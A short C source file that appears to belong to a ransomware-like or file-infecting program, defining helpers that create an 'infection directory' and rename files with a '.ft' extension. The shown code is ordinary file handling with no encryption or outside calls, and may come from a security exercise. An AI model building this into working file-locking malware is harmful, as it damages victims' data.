#include "utils.h"

// Function to check and create the infection directory if it does not exist
void setup_infection_directory() {
    char path[256];
    snprintf(path, sizeof(path), "%s%s", HOME, INFECTION_DIR);
    if (access(path, F_OK) != 0) {
        if (mkdir(path, 0755) != 0) {
            perror("Failed to create infection directory");
            exit(EXIT_FAILURE);
        }
    }
}

// Function to rename a file by adding ".ft" extension
void rename_file(const char *filename) {
    char new_filename[256];
    snprintf(new_filename, sizeof(new_filename), "%s.ft", filename);
    if (rename(filename, new_filename) != 0) {
        perror("Failed to rename file");
    }
}
